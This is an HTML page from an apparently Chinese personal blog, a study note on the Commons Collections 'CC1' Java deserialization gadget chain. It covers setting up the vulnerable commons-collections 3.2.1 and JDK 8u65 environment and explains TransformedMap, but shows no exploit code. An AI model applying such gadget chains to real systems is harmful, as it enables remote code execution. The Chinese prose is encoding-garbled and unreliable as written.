<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="JavaÂ≠¶‰π†">
<title>CC1</title>

<link rel='canonical' href='https://blog.xsxinghen.us.kg/p/cc1/'>

<link rel="stylesheet" href="/scss/style.min.e1efb040517648e3208ef025cee1558f4e3e423656425dbd8e07546d18e42b3b.css"><meta property='og:title' content="CC1">
<meta property='og:description' content="JavaÂ≠¶‰π†">
<meta property='og:url' content='https://blog.xsxinghen.us.kg/p/cc1/'>
<meta property='og:site_name' content='fupanc'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-01-22T13:30:53&#43;08:00'/><meta property='article:modified_time' content='2025-01-22T13:30:53&#43;08:00'/>
<meta name="twitter:title" content="CC1">
<meta name="twitter:description" content="JavaÂ≠¶‰π†">
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="ÂàáÊç¢ËèúÂçï">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/123_hu4212831438090465177.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üîã</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">fupanc</a></h1>
            <h2 class="site-description">Èó≠ÂÖ≥‰øÆË°åÔºå‰∏çÈóÆÂΩíÊúü</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/CaiJimmy/hugo-theme-stack'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>‰∏ªÈ°µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>ÂÖ≥‰∫é</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">
                    
                        <li id="i18n-switch">  
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
                                
                                    <option value="https://blog.xsxinghen.us.kg/en/" >English</option>
                                
                                    <option value="https://blog.xsxinghen.us.kg/" selected>‰∏≠Êñá</option>
                                
                            </select>
                        </li>
                    
                

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>ÊöóËâ≤Ê®°Âºè</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ÁõÆÂΩï</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li>
      <ol>
        <li>
          <ol>
            <li></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#commons-collections">Commons Collections</a>
      <ol>
        <li><a href="#ÂâçÁΩÆËØ¥Êòé">ÂâçÁΩÆËØ¥Êòé</a>
          <ol>
            <li><a href="#ÁéØÂ¢ÉÊê≠Âª∫">ÁéØÂ¢ÉÊê≠Âª∫</a></li>
            <li><a href="#Âä®ÊÄÅ‰ª£ÁêÜ">Âä®ÊÄÅ‰ª£ÁêÜ</a></li>
          </ol>
        </li>
        <li><a href="#Ê≠£ÂºèÂàÜÊûê">Ê≠£ÂºèÂàÜÊûê</a>
          <ol>
            <li><a href="#ÈúÄË¶Å‰∫ÜËß£ÁöÑÁ±ªÂíåÊé•Âè£">ÈúÄË¶Å‰∫ÜËß£ÁöÑÁ±ªÂíåÊé•Âè£</a></li>
            <li><a href="#ÊîªÂáªÊûÑÈÄ†">ÊîªÂáªÊûÑÈÄ†</a></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/java%E5%AD%A6%E4%B9%A0/" style="background-color: #2a9d8f; color: #fff;">
                JavaÂ≠¶‰π†
            </a>
        
            <a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/" >
                JavaÂèçÂ∫èÂàóÂåñË∞ÉÁî®Èìæ
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/cc1/">CC1</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            JavaÂ≠¶‰π†
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Jan 22, 2025</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    ÈòÖËØªÊó∂Èïø: 15 ÂàÜÈíü
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="cc1">CC1
</h1><p>ÂâçÈù¢ËØ¥Ëøá‰∫ÜURLDNSËøôÊù°ÈìæÔºåÁé∞Âú®Êàë‰ª¨Â∞±ÂèØ‰ª•ÂºÄÂßãÂ≠¶‰π†Common-CollectionsÂà©Áî®ÈìæÔºåËøôÊòØÂèçÂ∫èÂàóÂåñÂ≠¶‰π†‰∏≠‰∏çÂèØÈÄÉËøáÁöÑ‰∏ÄÂÖ≥„ÄÇ</p>
<h6 id="Â∞èÁöÑÁü•ËØÜÁÇπ">Â∞èÁöÑÁü•ËØÜÁÇπ
</h6><p>Êù•Ë°•ÂÖÖ‰∏Ä‰∏ã‰πãÂâç‰∏ÄÁõ¥ÈÅáÂà∞ÁöÑ‰∏Ä‰∏™Áü•ËØÜÁÇπÔºåJAVAÂü∫Á°ÄÔºå‰∏ÄÁõ¥Âú®ÂøòËÆ∞ÔºåÂ∞±ÊòØÊï∞ÁªÑÈóÆÈ¢òÔºåËøôÈáåÁÆÄÂçïËÆ∞ÂΩï‰∏Ä‰∏ãÊï∞ÁªÑÁöÑÂàùÂßãÂåñÈóÆÈ¢òÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//Á¨¨‰∏ÄÁßç ‰ΩøÁî®Êï∞ÁªÑÊù•Ë°®Á§∫‚Äú‰∏ÄÁªÑ‚ÄùintÁ±ªÂûã,ÁÑ∂ÂêéÂÜçÂàÜÂºÄËµãÂÄºÂç≥ÂèØ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kt">int</span><span class="o">[]</span><span class="w"> </span><span class="n">ns</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[</span><span class="n">5</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ns</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">68</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ns</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">66</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ÂèØ‰ª•‰ΩøÁî®</span><span class="w"> </span><span class="n">Êï∞ÁªÑÂèòÈáè</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="n">Ëé∑ÂèñÊï∞ÁªÑÂ§ßÂ∞è</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//Á¨¨‰∫åÁßç ÂÆö‰πâÊï∞ÁªÑÊó∂Áõ¥Êé•ÊåáÂÆöÂàùÂßãÂåñÁöÑÂÖÉÁ¥†ÔºåËøôÊ†∑Â∞±‰∏çÂøÖÂÜôÂá∫Êï∞ÁªÑÂ§ßÂ∞èÔºåËÄåÊòØÁî±ÁºñËØëÂô®Ëá™Âä®Êé®ÁÆóÊï∞ÁªÑÂ§ßÂ∞è„ÄÇ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kt">int</span><span class="o">[]</span><span class="w"> </span><span class="n">ns</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">12</span><span class="p">,</span><span class="n">23</span><span class="p">,</span><span class="n">24</span><span class="p">,</span><span class="n">45</span><span class="p">,</span><span class="n">45</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//Á¨¨‰∏âÁßç ËøòÂèØ‰ª•Âú®Á¨¨‰∫åÊ≠•Âü∫Á°Ä‰∏äËøõ‰∏ÄÊ≠•ÁÆÄÂÜô</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kt">int</span><span class="o">[]</span><span class="w"> </span><span class="n">ns</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">11</span><span class="p">,</span><span class="n">22</span><span class="p">,</span><span class="n">33</span><span class="p">,</span><span class="n">44</span><span class="p">,</span><span class="n">55</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//Á¨¨ÂõõÁßç  ËøôÈáåÂÜçÁÆÄÂçïËÆ≤ËÆ≤Â≠óÁ¨¶‰∏≤Êï∞ÁªÑ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">names</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s">&#34;haha&#34;</span><span class="p">,</span><span class="s">&#34;quke&#34;</span><span class="p">,</span><span class="s">&#34;erqieha&#34;</span><span class="p">};</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÊöÇÊó∂ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÂ∞±ÊòØËøôÂõõ‰∏™ÔºåÁé∞Âú®Â∞±Ê≠£ÂºèÂºÄÂßãÂ≠¶‰π†CCÈìæ„ÄÇ</p>
<h2 id="commons-collections">Commons Collections
</h2><h3 id="ÂâçÁΩÆËØ¥Êòé">ÂâçÁΩÆËØ¥Êòé
</h3><p><strong>Apache  CommonsÊòØApacheËΩØ‰ª∂Âü∫Èáë‰ºöÁöÑÈ°πÁõÆ</strong>ÔºåÊõæÁªèÈö∂Â±û‰∫éJakartaÈ°πÁõÆ„ÄÇCommonsÁöÑÁõÆÁöÑÊòØÊèê‰æõÂèØÈáçÁî®ÁöÑ„ÄÅËß£ÂÜ≥ÂêÑÁßçÂÆûÈôÖÁöÑÈÄöÁî®ÈóÆÈ¢ò‰∏îÂºÄÊ∫êÁöÑJava‰ª£Á†Å„ÄÇCommonsÁî±‰∏âÈÉ®ÂàÜÁªÑÊàêÔºöProperÔºàÊòØ‰∏Ä‰∫õÂ∑≤ÂèëÂ∏ÉÁöÑÈ°πÁõÆÔºâ„ÄÅSandboxÔºàÊòØ‰∏Ä‰∫õÊ≠£Âú®ÂºÄÂèëÁöÑÈ°πÁõÆÔºâÂíåDormantÔºàÊòØ‰∏Ä‰∫õÂàöÂêØÂä®ÊàñËÄÖÂ∑≤ÁªèÂÅúÊ≠¢Áª¥Êä§ÁöÑÈ°πÁõÆÔºâ„ÄÇ</p>
<p>Commons CollectionsÂåÖ‰∏∫JavaÊ†áÂáÜÁöÑCollections APIÊèê‰æõ‰∫ÜÁõ∏ÂΩìÂ•ΩÁöÑË°•ÂÖÖ„ÄÇÂú®Ê≠§Âü∫Á°Ä‰∏äÂØπÂÖ∂Â∏∏Áî®ÁöÑÊï∞ÊçÆÁªìÊûÑÊìç‰ΩúËøõË°å‰∫ÜÂæàÂ•ΩÁöÑÂ∞ÅË£Ö„ÄÅÊäΩË±°ÂíåË°•ÂÖÖ„ÄÇËÆ©Êàë‰ª¨Âú®ÂºÄÂèëÂ∫îÁî®Á®ãÂ∫èÁöÑËøáÁ®ã‰∏≠ÔºåÊó¢‰øùËØÅ‰∫ÜÊÄßËÉΩÔºåÂêåÊó∂‰πüËÉΩÂ§ßÂ§ßÁÆÄÂåñ‰ª£Á†Å„ÄÇ</p>
<p><strong>Áî±‰∫éÂ§ßÈáèÁöÑÁîü‰∫ßÁéØÂ¢É‰∏≠ÈÉΩ‰ºöÂØºÂÖ•Ëøô‰∏™ÂåÖÔºåÊâÄ‰ª•Ê≠§ÂåÖ‰∏≠ÁöÑ‰ºóÂ§öÂèçÂ∫èÂàóÂåñÈìæÂ∑≤ÁªèÊàê‰∏∫ÁªèÂÖ∏ÈìæÊù°</strong>„ÄÇ</p>
<p><strong>Â≠¶‰π†Ë∑ØÁ∫ø</strong>ÔºöCC1 -&gt; CC6 -&gt; CC3 -&gt; CC5 -&gt; CC7 -&gt; CC2 -&gt; CC4 (ÂÖ∂‰∏≠CC2ÂíåCC4ÊòØcommon-collections4ÁöÑÂà©Áî®Èìæ)</p>
<h4 id="ÁéØÂ¢ÉÊê≠Âª∫">ÁéØÂ¢ÉÊê≠Âª∫
</h4><p>Apache CommonsÈ°πÁõÆÈúÄË¶ÅÂØºÂÖ•ÔºåÊâÄ‰ª•<strong>Êàë‰ª¨Âú®ËøôÈáåÈúÄË¶ÅÊê≠Âª∫ÁéØÂ¢É</strong>ÔºåËøòÊòØ‰ΩøÁî®mavenÊù•ÂØºÂåÖÔºå‰øÆÊîπpom.xmlÂç≥ÂèØÔºåÊØîÂ¶ÇÊàëËøôÈáåË¶ÅÂØº‰∏Ä‰∏™cc3.2.1ÔºåÂä†‰∏äÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">commons</span><span class="o">-</span><span class="n">collections</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">commons</span><span class="o">-</span><span class="n">collections</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="n">3</span><span class="p">.</span><span class="na">2</span><span class="p">.</span><span class="na">1</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÜçÊõ¥Êñ∞‰∏Ä‰∏ãÈ°πÁõÆÂç≥ÂèØ„ÄÇ</p>
<h5 id="‰∏ãËΩΩÂπ∂‰∏îÈÖçÁΩÆÁõ∏Â∫îÊ∫êÁ†Å">‰∏ãËΩΩÂπ∂‰∏îÈÖçÁΩÆÁõ∏Â∫îÊ∫êÁ†Å
</h5><p>Âõ†‰∏∫JDKËá™Â∏¶¬∑ÁöÑÂåÖÈáåÈù¢Êúâ‰∫õÊñá‰ª∂ÊòØÂèçÁºñËØëÁöÑ.classÊñá‰ª∂ÂØºËá¥Êàë‰ª¨Ê≤°Ê≥ïÊ∏ÖÊ•öÁúãÊáÇ‰ª£Á†ÅÔºå‰∏∫‰∫ÜÊñπ‰æøË∞ÉËØïÔºåÊàë‰ª¨ÈúÄË¶ÅÂ∞ÜÂÆÉ‰ª¨ËΩ¨Âèò‰∏∫.javaÊñá‰ª∂ÔºåËøôÂ∞±ÈúÄË¶ÅÊàë‰ª¨ÂÆâË£ÖÂìçÂ∫îÁöÑÊ∫êÁ†Å„ÄÇ</p>
<p>‰∏ãËΩΩÂú∞ÂùÄÔºöhttps://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</p>
<p>ÂÖàÂéüÊú¨jdkÁõÆÂΩï‰∏ãÁöÑsrc.zipËß£ÂéãÂà∞ÂΩìÂâçÁõÆÂΩïÔºåÂú®ÈìæÊé•‰∏≠ÁÇπÂáªzip‰∏ãËΩΩÂêéËß£ÂéãÔºåÂú®/src/share/classes‰∏≠ÊâæÂà∞sunÊñá‰ª∂ÔºåÊääÂÖ∂Â§çÂà∂Âà∞ÂéüÊú¨jdk‰∏≠src.zipÁöÑËß£ÂéãÊñá‰ª∂„ÄÇ</p>
<p><img src="/p/cc1/image-20240721000550724.png"
	width="565"
	height="239"
	srcset="/p/cc1/image-20240721000550724_hu17316632023481846834.png 480w, /p/cc1/image-20240721000550724_hu8435638651555392542.png 1024w"
	loading="lazy"
	
		alt="image-20240721000550724"
	
	
		class="gallery-image" 
		data-flex-grow="236"
		data-flex-basis="567px"
	
></p>
<p>ÊúÄÂêéÂÜçÂú®idea‰∏≠ÊääsrcÊñá‰ª∂Â§πÊ∑ªÂä†Âà∞ÂéüË∑ØÂæÑ‰∏ãÂç≥ÂèØÔºö</p>
<p><img src="/p/cc1/image-20240721000648000.png"
	width="1144"
	height="362"
	srcset="/p/cc1/image-20240721000648000_hu412859268323998516.png 480w, /p/cc1/image-20240721000648000_hu2791816205883402190.png 1024w"
	loading="lazy"
	
		alt="image-20240721000648000"
	
	
		class="gallery-image" 
		data-flex-grow="316"
		data-flex-basis="758px"
	
></p>
<h4 id="Âä®ÊÄÅ‰ª£ÁêÜ">Âä®ÊÄÅ‰ª£ÁêÜ
</h4><p>‰∏ªË¶ÅÂÜÖÂÆπÂ∞±ÂõûÂéªÁúãÂä®ÊÄÅ‰ª£ÁêÜÁ¨îËÆ∞ÁöÑÂÜÖÂÆπÔºå‰∏ªË¶ÅÂ∞±ÊòØ‰∏Ä‰∏™ÁÇπÔºö<strong>ÂΩìÊàë‰ª¨Ë∞ÉÁî®Êüê‰∏™Âä®ÊÄÅ‰ª£ÁêÜÂØπË±°ÁöÑÊñπÊ≥ïÊó∂ÔºåÈÉΩ‰ºöËß¶Âèë‰ª£ÁêÜÁ±ªÁöÑInvokeÊñπÊ≥ïÔºåÂπ∂‰º†ÈÄíÂØπÂ∫îÁöÑÂÜÖÂÆπ„ÄÇ</strong></p>
<h3 id="Ê≠£ÂºèÂàÜÊûê">Ê≠£ÂºèÂàÜÊûê
</h3><p><strong>ÊµãËØïÁéØÂ¢ÉÔºö</strong></p>
<ul>
<li>JDK 8u65</li>
<li>commons-collections 3.2.1</li>
</ul>
<h4 id="ÈúÄË¶Å‰∫ÜËß£ÁöÑÁ±ªÂíåÊé•Âè£">ÈúÄË¶Å‰∫ÜËß£ÁöÑÁ±ªÂíåÊé•Âè£
</h4><h5 id="abstractmapdecorator">AbstractMapDecorator
</h5><p>Âú®CCÂ∫ì‰∏≠Êèê‰æõ‰∫Ü‰∏Ä‰∏™ÊäΩË±°Á±ª<code>org.apache.commons.collections.map.AbstractMapDecorator</code>ÔºåËøô‰∏™Á±ªÊòØMapÁöÑÊâ©Â±ïÔºå‰ªéÂêçÂ≠óÊù•ÁúãÔºåËøôÊòØ‰∏Ä‰∏™Âü∫Á°ÄÁöÑË£ÖÈ•∞Âô®ÔºåÁî®Êù•ÁªômapÊèê‰æõÈôÑÂä†ÂäüËÉΩÔºåË¢´Ë£ÖÈ•∞ÁöÑmapÂ≠òÂú®ËØ•Á±ªÁöÑÂ±ûÊÄß‰∏≠ÔºåÂπ∂‰∏îÂ∞ÜÊâÄÊúâÁöÑÊìç‰ΩúÈÉΩËΩ¨ÂèëÁªôËøô‰∏™map„ÄÇ</p>
<p>Ëøô‰∏™Á±ªÊúâÂæàÂ§öÂÆûÁé∞Á±ªÔºåÂêÑ‰∏™Á±ªËß¶ÂèëÁöÑÊñπÂºè‰∏çÂêåÔºåÈáçÁÇπÂÖ≥Ê≥®ÁöÑÊòØTransformedMap ‰ª•ÂèäLazyMap„ÄÇ</p>
<h5 id="transformedmap">TransformedMap
</h5><p><code>org.apache.commons.collections.map.TransformedMap</code>Á±ªÂèØ‰ª•Âú®‰∏Ä‰∏™ÂÖÉÁ¥†Ë¢´Âä†ÂÖ•Âà∞ÈõÜÂêàÂÜÖÊó∂ÔºåËá™Âä®ÂØπËØ•ÂÖÉÁ¥†ËøõË°åÁâπÂÆöÁöÑ‰øÆÈ•∞ÂèòÊç¢ÔºåÂÖ∑‰ΩìÁöÑÂèòÊç¢ÈÄªËæëÁî±TransformerÊù•ÂÆö‰πâÔºåTransformer Âú® TransformedMap ÂÆû‰æãÂåñÊó∂‰Ωú‰∏∫ÂèÇÊï∞‰º†ÂÖ•„ÄÇÂèØ‰ª•ÁÆÄÂçïÁúãÁúãËøô‰∏™Á±ªÁöÑÂÆö‰πâÔºö</p>
<p><img src="/p/cc1/image-20240722000418925.png"
	width="1038"
	height="49"
	srcset="/p/cc1/image-20240722000418925_hu15274512544975536471.png 480w, /p/cc1/image-20240722000418925_hu4389391947249046937.png 1024w"
	loading="lazy"
	
		alt="image-20240722000418925"
	
	
		class="gallery-image" 
		data-flex-grow="2118"
		data-flex-basis="5084px"
	
></p>
